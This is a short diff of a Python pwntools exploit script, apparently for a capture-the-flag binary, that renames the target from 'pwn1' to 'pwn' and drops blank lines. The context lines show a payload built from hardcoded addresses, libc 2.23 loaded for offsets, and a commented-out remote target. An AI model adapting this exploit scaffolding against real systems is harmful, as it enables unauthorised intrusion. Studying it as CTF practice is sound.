@@ -21,9 +21,8 @@ def disp(p, idx):
     p.recvuntil('index')
     p.sendline(str(idx))
 
-
 def main():
-    p = process('./pwn1')
+    p = process('./pwn')
     #p = remote('172.16.9.21', 9007)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so', checksec=False)
     p.recvuntil('name?')
@@ -35,7 +34,6 @@ def main():
     payload += p64(0x6021C0 - 8)
     payload += p64(0)*4
     payload += p64(0x401121)
-
 
     p.send(payload)
     new(p, 0x88, 'a')
